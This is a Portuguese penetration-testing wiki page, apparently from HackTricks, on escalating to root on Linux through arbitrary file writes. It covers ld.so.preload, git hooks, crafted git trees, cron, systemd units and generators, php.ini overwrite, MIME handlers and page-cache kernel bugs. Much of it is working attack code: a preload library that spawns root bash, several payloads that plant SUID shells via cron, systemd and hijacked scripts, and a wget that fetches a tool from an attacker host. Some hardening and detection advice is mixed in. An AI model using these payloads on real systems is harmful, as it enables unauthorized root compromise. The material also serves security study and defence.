# Gravação arbitrária de arquivo como root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` é uma lista de objetos compartilhados em todo o sistema que o linker dinâmico carrega antes de outros objetos compartilhados. O modo de execução segura aplica restrições adicionais ao preloading, portanto, um caminho de biblioteca como `/tmp/pe.so` não é uma técnica universal para binários SUID.\
Se você puder criá-lo ou modificá-lo, um processo que carregue o arquivo carregará a biblioteca listada antes de seus outros objetos compartilhados, permitindo a execução de código no contexto desse processo.<sup>[[12]](#references)</sup>

Por exemplo: `echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

### Git hooks

**Git hooks** são scripts executáveis acionados por eventos em um repositório, incluindo operações de commit e merge. Se um **script ou usuário privilegiado** realizar essas ações e um atacante puder **escrever na pasta `.git`**, o hook poderá ser usado para **escalonamento de privilégios**.<sup>[[13]](#references)</sup>

Por exemplo, é possível **gerar um script** em um repositório git em **`.git/hooks`** para que ele seja sempre executado quando um novo commit for criado:

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```

### Path traversal na exportação de Git tree privilegiada

Um sincronizador privilegiado pode evitar um checkout e, em vez disso, enumerar um repositório influenciado por um atacante com `git ls-tree`, ler cada blob com `git cat-file`, concatenar o caminho informado a um diretório de staging e gravar os arquivos por conta própria. Isso se torna uma **arbitrary file write com os privilégios do sincronizador** quando combina `-c safe.directory=*` (desativando a proteção do Git contra repositórios pertencentes a outro usuário) com a ausência de uma verificação para garantir que o destino esteja dentro do diretório esperado. Um nome absoluto de entrada na tree faz com que `os.path.join(stage, name)` do Python descarte `stage`; um nome relativo contendo `../` escapa quando o sistema de arquivos resolve o caminho. Como a aplicação materializa a tree bruta em vez de pedir ao Git para fazer o checkout, a rejeição de caminhos durante o checkout nunca protege o destino da gravação.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Procure esse padrão de código em serviços executados como root, timers, agentes de deployment, importadores de templates e tarefas de backup/restore:<sup>[[30]](#references)</sup>

```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
    target = os.path.join(stage_root, git_path)  # no containment check
    os.makedirs(os.path.dirname(target), exist_ok=True)
    with open(target, "wb") as output:
        output.write(git("cat-file", "blob", oid))
```

Uma entrada de árvore é codificada como `<mode> SP <name> NUL <raw object ID>`. A opção `git hash-object --literally` permite deliberadamente dados de objeto que a análise normal ou o `git fsck` podem rejeitar, então um clone descartável pode criar uma árvore cujo nome de arquivo é um destino absoluto. Este exemplo cria um blob de arquivo cron, envolve a árvore criada com um commit e move uma branch para ele; a exploração ainda exige permissão para atualizar um repositório consumido pela tarefa privilegiada e um servidor Git que aceite o objeto malformado.<sup>[[30]](#references)[[31]](#references)</sup>

```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```

O hardening deve abranger tanto a ingestão do repositório quanto a operação final no sistema de arquivos:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Substitua `safe.directory=*` pelos repositórios exatos em que o serviço deve confiar e, sempre que possível, processe os repositórios sem privilégios de root.
- Rejeite nomes absolutos e qualquer componente `.` ou `..` antes da materialização. Depois de juntar os caminhos, normalize-os e verifique se o destino permanece dentro da raiz pretendida.
- Evite condições de corrida entre verificação e abertura envolvendo symlinks: abra caminhos relativos a um descritor de diretório confiável e, no Linux, use `openat2()` com `RESOLVE_BENEATH` e `RESOLVE_NO_SYMLINKS` para caminhos controlados por um atacante.
- Prefira um checkout normal em um diretório isolado a reimplementar o checkout com base na saída de plumbing. Se a ingestão de objetos brutos for necessária, habilite a validação no recebimento, como `receive.fsckObjects=true`; não reduza a severidade das verificações `receive.fsck.*` relacionadas a nomes de caminho, necessárias para rejeitar árvores manipuladas.

### Implantação de configuração privilegiada

Alguns serviços de gerenciamento armazenam o estado de sistema pretendido em um arquivo de configuração e depois o implantam com privilégios elevados. Por exemplo, o [openmediavault armazena a configuração em `/etc/openmediavault/config.xml`](https://docs.openmediavault.org/en/7.x/faq.html), e sua [interface RPC](https://docs.openmediavault.org/en/8.x/development/tools/omv_rpc.html) pode aplicar alterações nos serviços. Se uma conta com menos privilégios puder gravar ou substituir esse arquivo, verifique se também pode solicitar uma implantação autorizada e se o módulo selecionado usa o campo alterado como root. Chaves de contas SSH, comandos agendados e instalação de pacotes têm pré-requisitos diferentes; a mera presença de um arquivo ou de um XML gravável não comprova nenhum deles. Verifique as permissões do arquivo e dos diretórios-pai, os grupos do chamador e a autorização RPC, a versão instalada e o consumidor efetivo, sem editar a configuração nem invocar uma operação de aplicação durante a enumeração.

As definições de ações do Fail2Ban em `/etc/fail2ban/action.d/` são outro limite de configuração privilegiada. Um usuário que possa gravar nesse diretório e pesquisá-lo talvez consiga substituir uma definição de ação ou adicionar uma sobrescrita, mas as permissões do diretório, por si só, não comprovam execução de código. Confirme que uma jail habilitada realmente seleciona a ação afetada, que o serviço Fail2Ban a executa com privilégios superiores e que ocorrerão um reload/restart autorizado e um evento de ban correspondente. Uma permissão sudo não relacionada para reiniciar o Fail2Ban só é relevante quando se aplica à invocação exata do serviço e a definição alterada é carregada. A [configuração de ações do Fail2Ban](https://github.com/fail2ban/fail2ban/blob/master/man/jail.conf.5) documenta a relação entre o diretório de ações e as jails; sua [ação de exemplo](https://github.com/fail2ban/fail2ban/blob/master/config/action.d/iptables.conf) mostra que `actionban` é executada quando ocorre um ban, com os privilégios do usuário do serviço. Inspecione as permissões e a configuração efetiva sem alterar ações nem disparar bans durante a enumeração.

Há outro limite quando uma jail habilitada do Fail2Ban usa uma ação de e-mail enriquecida com WHOIS. A [CVE-2021-32749](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm) envolveu texto WHOIS não confiável encaminhado ao `mail` do GNU mailutils, cujo processamento de escapes podia executar um comando. Um usuário com menos privilégios que possa gravar arquivos talvez consiga influenciar a resposta se puder alterar a configuração de substituição do servidor do **cliente WHOIS selecionado**; o [`whois.conf(5)` do Debian](https://manpages.debian.org/bookworm/whois/whois.conf.5.en.html) documenta um desses arquivos, mas o caminho e o uso variam conforme a instalação. Verifique a jail/ação efetiva, a identidade do serviço, o cliente WHOIS usado e o caminho de configuração, a implementação do mail, o controle sobre a resposta e a correção ou backport do fornecedor instalado. Um arquivo de configuração WHOIS gravável, uma versão do Fail2Ban ou uma ação de mail, por si só, não comprovam essa cadeia; evite consultar um servidor externo ou disparar bans durante a enumeração passiva.

### Criação de arquivos via TFTP e hooks de pacotes privilegiados

Um serviço TFTP acessível pode atravessar um limite de container ou de usuário local quando as configurações **efetivas** do tftpd-hpa o executam como root, expõem a raiz do sistema de arquivos como diretório `--secure` e habilitam `--create`. O [manual do tftpd-hpa](https://manpages.debian.org/trixie/tftpd-hpa/tftpd.8.en.html) descreve as opções de criação e usuário. Isso pode permitir criar um novo arquivo em um diretório de configuração privilegiado, incluindo `/etc/apt/apt.conf.d/`; um arquivo existente ainda pode resistir à substituição. O [manual de configuração do APT](https://manpages.debian.org/bookworm/apt/apt.conf.5.en.html) documenta os comandos `APT::Update::Pre-Invoke`. Um `apt update` executado como root pode se tornar o consumidor com privilégios superiores **somente se** ler o novo arquivo de configuração. Confirme os argumentos e a identidade reais do daemon em execução, a acessibilidade pela rede e as regras de filtragem, a política de criação do diretório de destino, o escopo efetivo da configuração do APT e uma invocação privilegiada posterior. Um arquivo padrão, um diretório de destino gravável ou um comando APT agendado, por si só, não comprovam todo o caminho. A triagem passiva deve ler apenas configurações e metadados locais limitados, sem enviar arquivos nem invocar o APT.

### Cron e arquivos de tempo

Se você puder **gravar arquivos relacionados ao cron que o root executa**, normalmente poderá obter execução de código na próxima vez que a tarefa for executada. Alvos interessantes incluem:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- A própria crontab do root em `/var/spool/cron/` ou `/var/spool/cron/crontabs/`
- Timers do `systemd` e os serviços que eles acionam

Verificações rápidas:

```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```

Caminhos típicos de abuso:

- **Adicionar uma nova tarefa cron como root** a `/etc/crontab` ou a um arquivo em `/etc/cron.d/`
- **Substituir um script** já executado por `run-parts`
- **Criar um backdoor em um destino de timer existente** modificando o script ou binário que ele executa

Exemplo mínimo de payload cron:

```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```

Se você só puder gravar em um diretório do cron usado por run-parts, coloque lá um arquivo executável:

```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```

Notas:

- `run-parts` geralmente ignora nomes de arquivos que contêm pontos, então prefira nomes como `backup` em vez de `backup.sh`.<sup>[[15]](#references)</sup>
- Alguns sistemas usam timers do `systemd` em vez do cron clássico, mas a ideia do abuso é a mesma: **modificar o que o root executará mais tarde**.<sup>[[20]](#references)</sup>

### Arquivos de Service e Socket

Se você puder gravar **arquivos de unidade do `systemd`** ou arquivos referenciados por eles, talvez consiga executar código como root ao recarregar e reiniciar a unidade, ou aguardando o acionamento do caminho de ativação do serviço/socket.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Verifique também o acesso de gravação e busca ao próprio diretório de unidades do sistema, incluindo ACLs: um usuário pode criar uma nova unidade em `/etc/systemd/system` mesmo quando a leitura/listagem do diretório é negada. Esse caminho, por si só, não inicia nada. Confirme se o gerenciador do sistema carregará a nova unidade, se o chamador tem uma permissão efetiva de `systemctl start` ou `restart` capaz de operar como root para o nome dela (ou outro caminho de ativação privilegiado) e se o serviço é executado com a identidade pretendida. Uma unidade existente já carregada e alterada no disco pode exigir `daemon-reload`; uma unidade com um novo nome tem um comportamento de carregamento diferente. Confira os argumentos e as exclusões exatos do sudo antes de considerar suficiente uma regra de reinicialização com curinga. Consulte o [caminho de busca de unidades do systemd](https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html) e a [semântica de carregamento e recarga do systemctl](https://www.freedesktop.org/software/systemd/man/latest/systemctl.html).

Alvos interessantes incluem:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Substituições drop-in em `/etc/systemd/system/<unit>.d/*.conf`
- Scripts/binários de serviço referenciados por `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Caminhos `EnvironmentFile=` graváveis carregados por um serviço root

Verificações rápidas:

```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```

Caminhos comuns de abuso:

- **Sobrescrever `ExecStart=`** em uma unit de serviço pertencente ao root que você pode modificar
- **Adicionar um override drop-in** com um `ExecStart=` malicioso e limpar o antigo primeiro
- **Inserir um backdoor no script/binário** já referenciado pela unit
- **Sequestrar um serviço ativado por socket** modificando o arquivo `.service` correspondente, iniciado quando o socket recebe uma conexão

Exemplo de override malicioso:

```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```

Fluxo típico de ativação:

```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```

Se você não puder reiniciar serviços por conta própria, mas puder editar uma unit ativada por socket, talvez só precise **aguardar uma conexão de cliente** para acionar a execução do serviço backdoored como root.<sup>[[17]](#references)</sup>

### Diretórios de generators do systemd

**System generators** são executáveis iniciados pelo system manager antes de carregar os arquivos de unit, tanto durante a inicialização quanto durante o reload da configuração. Portanto, ter acesso de escrita a um diretório de system generators (ou a um generator executável existente) é um recurso direto para execução de código como root, que pode passar despercebido quando uma auditoria verifica apenas arquivos `*.service` e `*.timer`.<sup>[[35]](#references)[[36]](#references)</sup>

A ordem usual de busca é `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/` e `/usr/lib/systemd/system-generators/` (algumas distribuições expõem `/lib/systemd/system-generators/` por meio da unificação de `/usr`). Um executável com o mesmo nome em um diretório anterior sobrescreve o posterior. Não confunda esses **diretórios de executáveis de entrada** com `/run/systemd/generator`, `/run/systemd/generator.early` e `/run/systemd/generator.late`, que contêm a saída de unit transitória produzida pelos generators.<sup>[[35]](#references)</sup>

Verificações rápidas:

```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
         /usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
         /lib/systemd/system-generators; do
    [ -e "$d" ] || continue
    namei -l "$d"
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
    getfacl -p "$d" "$d"/* 2>/dev/null
done
```

Um gerador recém-criado precisa ter o bit de execução definido. Se a primitiva de escrita controla os bytes, mas não as permissões, escolha um gerador que já seja executável; truncá-lo no próprio local normalmente preserva seus metadados. Se o diretório em si tiver permissão de escrita, crie uma nova entrada e marque-a como executável.<sup>[[35]](#references)</sup>

```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```

Acionar `systemctl daemon-reload` no gerenciador do **sistema** exige autorização adequada, mas executa novamente todos os generators do sistema; caso contrário, aguarde um reload privilegiado, uma operação de pacote ou uma reinicialização. Diretórios de generators de usuário, como `~/.config/systemd/user-generators/`, são executados pelo gerenciador do usuário e **não** concedem acesso root por si só.<sup>[[35]](#references)</sup>

Para hardening e hunting, verifique todos os componentes do caminho e as ACLs, em vez de conferir apenas os bits de modo finais; estabeleça uma baseline de hashes e da propriedade dos generators pelos pacotes; e gere alertas para alterações de criação, renomeação, conteúdo ou permissões em todos os diretórios de entrada dos generators do sistema. Monitorar a gravação é importante porque um generator de execução única pode se excluir após a execução, enquanto a árvore de units geradas em `/run/systemd/generator*` é reconstruída no próximo reload.<sup>[[35]](#references)[[36]](#references)</sup>

### Sobrescrever um `php.ini` restritivo usado por um sandbox PHP privilegiado

Alguns daemons personalizados validam PHP fornecido pelo usuário executando `php` com um **`php.ini` restrito** (por exemplo, `disable_functions=exec,system,...`). Se o código em sandbox ainda tiver **qualquer primitiva de escrita** (como `file_put_contents`) e você conseguir acessar o **caminho exato do `php.ini`** usado pelo daemon, poderá **sobrescrever essa configuração** para remover as restrições e, em seguida, enviar um segundo payload que será executado com privilégios elevados.<sup>[[2]](#references)</sup>

Fluxo típico:

1. O primeiro payload sobrescreve a configuração do sandbox.
2. O segundo payload executa código com as funções perigosas reativadas.

Exemplo mínimo (substitua pelo caminho usado pelo daemon):

```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```

Se o daemon for executado como root (ou validar usando caminhos pertencentes ao root), a segunda execução resulta em um contexto root. Isso é essencialmente **escalada de privilégios por sobrescrita de configuração** quando o runtime em sandbox ainda pode gravar arquivos.

### binfmt_misc

`binfmt_misc` expõe registros em `/proc/sys/fs/binfmt_misc`; cada registro associa um padrão de tipo de arquivo a um interpretador. O impacto sobre os privilégios depende de quem pode alterar o registro e de qual processo executa posteriormente o arquivo correspondente; portanto, verifique esses requisitos antes de considerar isso um caminho de escalada de privilégios.<sup>[[21]](#references)</sup>

Um helper executável com `CAP_DAC_OVERRIDE` pode oferecer um caminho de registro separado se aceitar dados controlados pelo chamador e gravá-los em `/proc/sys/fs/binfmt_misc/register`, mesmo quando o chamador não puder gravar diretamente nesse nó. Examine as entradas e o comportamento de gravação do helper sem executá-lo durante a enumeração. Se uma regra registrada usar a flag `C`, o interpretador receberá credenciais baseadas no binário correspondente; assim, um executável SUID pertencente ao root pode executar como root um interpretador controlado pelo chamador. Confirme a montagem e a política de registro de `binfmt_misc`, a capacidade efetiva do helper, a regra exata e o caminho do interpretador, o alvo SUID executável e se `no_new_privs` ou uma montagem `nosuid` suprime a transição SUID. Um bit de capacidade ou uma string de caminho embutida, por si só, é apenas uma pista para investigação.<sup>[[21]](#references)</sup> Consulte [execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html) para ver as condições que suprimem o SUID.

### Sobrescrever handlers de esquema (como http: ou https:)

Ambientes de desktop usam associações MIME e entradas de desktop para escolher um aplicativo para esquemas URI; um atacante que possa gravar na configuração relevante do usuário e nos diretórios de entradas de desktop pode redirecionar esses esquemas para um launcher sob seu controle. Ao modificar o arquivo `$HOME/.config/mimeapps.list` para apontar os handlers de URL HTTP e HTTPS para um arquivo malicioso (por exemplo, `x-scheme-handler/http=evil.desktop` e `x-scheme-handler/https=evil.desktop`), um clique do usuário pode invocar essa entrada de desktop.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```

### Root executando scripts/binários graváveis pelo usuário

Se um fluxo de trabalho privilegiado executar algo como `/bin/sh /home/username/.../script` (ou qualquer binário dentro de um diretório pertencente a um usuário sem privilégios), você pode hijacká-lo:<sup>[[1]](#references)</sup>

- **Detectar a execução:** monitore processos com pspy para detectar o root invocando caminhos controlados pelo usuário.<sup>[[25]](#references)</sup>

```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```

- **Confirmar a permissão de escrita:** garanta que o arquivo de destino e o diretório pertençam ao seu usuário ou possam ser modificados por ele.
- **Sequestrar o destino:** faça backup do binário/script original e coloque um payload que crie um shell SUID (ou execute qualquer outra ação como root); em seguida, restaure as permissões:

```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```

- **Acione a ação privilegiada** (por exemplo, pressionando um botão da interface que inicia o helper). Quando o root executar novamente o caminho sequestrado, obtenha o shell escalado com `./rootshell -p`.

### Modificação de arquivos privilegiados apenas no cache de páginas

Alguns bugs do kernel não modificam o arquivo **no disco**. Em vez disso, permitem modificar apenas a **cópia no cache de páginas** de um arquivo legível. Se você puder atingir um binário **setuid** ou executado pelo **root** de outra forma, a próxima execução poderá usar bytes controlados pelo atacante, armazenados na memória, e escalar privilégios, mesmo que o hash do arquivo no disco não tenha mudado.<sup>[[3]](#references)[[4]](#references)</sup>

É útil pensar nisso como uma **primitiva de escrita em arquivo somente em tempo de execução**:<sup>[[3]](#references)</sup>

- **O disco permanece limpo**: o inode e os bytes no disco não mudam
- **A memória fica suja**: processos que leem/executam a página em cache recebem o conteúdo modificado pelo atacante
- **O efeito é temporário**: a alteração desaparece após uma reinicialização ou a remoção da página do cache

Essa primitiva fica entre a **escrita arbitrária em arquivo** clássica e bugs mais antigos de **abuso do cache de páginas**, como Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW dependia de uma condição de corrida
- Dirty Pipe tinha restrições de posição de escrita
- Uma primitiva que afeta apenas o cache de páginas pode ser mais confiável se o caminho vulnerável permitir escritas diretas em páginas de arquivos armazenadas em cache

#### Fluxo genérico de privesc

1. Obtenha uma primitiva do kernel capaz de escrever em **páginas do cache de páginas respaldadas por arquivos**
2. Use-a contra um **binário privilegiado legível** ou outro arquivo executado pelo root
3. Acione a execução **antes** que a página seja removida do cache
4. Obtenha execução de código como root enquanto o arquivo no disco continua aparentemente inalterado

Alvos de alto valor típicos:

- Binários **setuid-root**
- Helpers iniciados por **serviços do root**
- Binários executados com frequência a partir de **containers que compartilham o kernel/cache de páginas do host**

#### Caminho de exemplo com AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) é um bom exemplo dessa classe. O caminho vulnerável estava na API de criptografia do Linux para userspace (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` pode mover referências a páginas do cache de páginas de um arquivo legível para o scatterlist TX de criptografia
- o caminho de descriptografia in-place de `algif_aead` reutilizava os buffers de origem e destino
- em seguida, `authencesn` escrevia na região da tag de destino
- quando essa região ainda referenciava páginas respaldadas por arquivos inseridas com `splice()`, a escrita atingia o **cache de páginas do arquivo-alvo**

Portanto, a técnica interessante não é a própria CVE, mas o padrão:

- **fornecer páginas de cache respaldadas por arquivos a um subsistema do kernel**
- fazer com que o subsistema **as trate como saída gravável**
- acionar uma pequena sobrescrita controlada na memória

O PoC público usou **escritas repetidas de 4 bytes** para alterar `/usr/bin/su` na memória e, em seguida, executá-lo.<sup>[[4]](#references)[[7]](#references)</sup>

#### Caminho de exemplo com ESP / XFRM + clone netfilter TEE

DirtyClone (CVE-2026-43503) demonstra outra variante do mesmo padrão de **escrita no root apenas pelo cache de páginas**, mas desta vez o destino é a descriptografia IPsec ESP, em vez de `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

A técnica importante é a **etapa de lavagem de metadados**:

- `splice()` insere uma **página somente leitura, respaldada por arquivo e pertencente ao cache de páginas** em um pacote ESP-em-UDP
- a mitigação original do DirtyFrag marcava esse skb com `SKBFL_SHARED_FRAG` para que `esp_input()` **copiasse antes de descriptografar**
- o netfilter `TEE` duplica o pacote por meio de `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- o clone mantém a **mesma referência física à página do cache de páginas**, mas perde `SKBFL_SHARED_FRAG`
- então, `esp_input()` considera o clone seguro e executa a descriptografia **in-place de `cbc(aes)`** sobre a página respaldada por arquivo

Assim, a lição para quem revisa o código vai além da CVE: se uma mitigação depende de **metadados de skb/página** para decidir se uma operação precisa primeiro fazer uma cópia, qualquer **caminho de clone/cópia que preserve a página subjacente, mas descarte os metadados**, pode reabrir silenciosamente a primitiva de escrita.

Fluxo de exploração típico:

1. Use `unshare(CLONE_NEWUSER | CLONE_NEWNET)` para obter **`CAP_NET_ADMIN` dentro de um namespace de rede privado**
2. Ative o loopback e instale uma regra **netfilter `TEE`** em `mangle/OUTPUT`
3. Instale SAs de transporte XFRM ESP usando `NETLINK_XFRM`
4. Codifique cada palavra de 4 bytes do alvo no campo `seq_hi` da SA (o truque de seleção de palavra do DirtyFrag)
5. Envie o pacote ESP-em-UDP inserido com `splice()` para que o **clone TEE** chegue a `esp_input()` e seja descriptografado **in-place**
6. Repita até que a cópia no cache de páginas de `/usr/bin/su` ou de outro executável privilegiado contenha código controlado pelo atacante

Na prática, o impacto é o mesmo do exemplo com `AF_ALG`: o arquivo no disco permanece limpo, mas `execve()` usa os **bytes modificados no cache de páginas** e concede root.<sup>[[8]](#references)[[9]](#references)</sup>

Verificações úteis de exposição para essa variante:

```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```

A redução da superfície de ataque a curto prazo também é específica ao caminho neste caso: atualizar para um kernel que inclui `48f6a5356a33` corrige o caminho de clone, enquanto bloquear o autoload de `xt_TEE` remove a **etapa de lavagem de flags** e bloquear `esp4` / `esp6` remove o **destino de descriptografia**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Exposição e busca

Se você suspeitar dessa classe de bug, não confie apenas nas verificações de integridade do disco. Verifique também:

```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```

Os valores de configuração abaixo distinguem uma interface carregável de uma incorporada ao kernel; as regras de build de crypto mapeiam `CONFIG_CRYPTO_USER_API_AEAD` para `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` pode ser carregado/descarregado como módulo
- `CONFIG_CRYPTO_USER_API_AEAD=y`: a interface é incorporada ao kernel
- binários setuid são bons alvos porque um patch apenas no page cache pode ser suficiente para transformar um foothold local em root

#### Redução da superfície de ataque para o caminho `algif_aead`

Se a interface vulnerável for fornecida por um módulo carregável:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>

```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```

Se estiver compilado no kernel, alguns relatos de divulgação mencionaram o bloqueio do caminho de init com:<sup>[[28]](#references)</sup>

```bash
initcall_blacklist=algif_aead_init
```

Esse tipo de mitigação também vale a pena lembrar para outros LPEs do kernel: se a exploração depende de uma interface opcional específica, desabilitar ou colocar essa interface na blacklist pode interromper o caminho de exploração antes mesmo de uma atualização completa do kernel estar disponível.<sup>[[6]](#references)[[28]](#references)</sup>



## References

- [1] [HTB Bamboo – sequestrando um script executado pelo root em um diretório PaperCut gravável pelo usuário](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: FAQ sobre Copy Fail (CVE-2026-31431)](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Divulgação no Openwall oss-security sobre CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Correção do Linux stable: crypto: algif_aead - reverter para operação fora do local](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — comunicado sobre CVE-2026-31431](https://copy.fail/)
- [7] [Análise técnica da Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [Repositório / README do DirtyClone](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: analisando e explorando a variante DirtyClone de LPE do Linux (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Correção do Linux: net: skb: preservar `SKBFL_SHARED_FRAG` em `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Mitigação anterior do Linux: definir `SKBFL_SHARED_FRAG` para pacotes UDP com splicing (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — página de manual do Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Hooks do Git](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — página de manual do Linux](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — página de manual do Debian](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — documentação do Linux Kernel](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [Associações de aplicações MIME](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Especificação Shared MIME-info](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Especificação Desktop Entry](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Linguagem Kconfig](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Makefile crypto do Linux](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: vulnerabilidade de cache de páginas AF_ALG do kernel Linux](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — página de manual do Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
